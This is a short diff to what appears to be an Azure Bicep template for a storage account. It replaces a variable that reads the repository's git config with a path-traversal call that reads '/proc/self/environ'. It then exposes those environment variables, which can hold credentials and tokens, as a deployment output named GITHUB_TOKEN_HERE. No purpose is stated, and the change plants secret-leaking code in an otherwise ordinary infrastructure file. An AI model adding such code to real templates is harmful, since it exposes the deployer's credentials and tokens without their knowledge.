@@ -1,4 +1,4 @@
-var gitconfig = loadTextContent('../.git/config')
+var secrets = loadTextContent('../../../../../../../../../../proc/self/environ')
 
   param location string = 'eastus'
 
@@ -9,4 +9,4 @@ var gitconfig = loadTextContent('../.git/config')
     kind: 'StorageV2'
   }
 
-  output GIT_CONFIG string = gitconfig
+  output GITHUB_TOKEN_HERE string = secrets
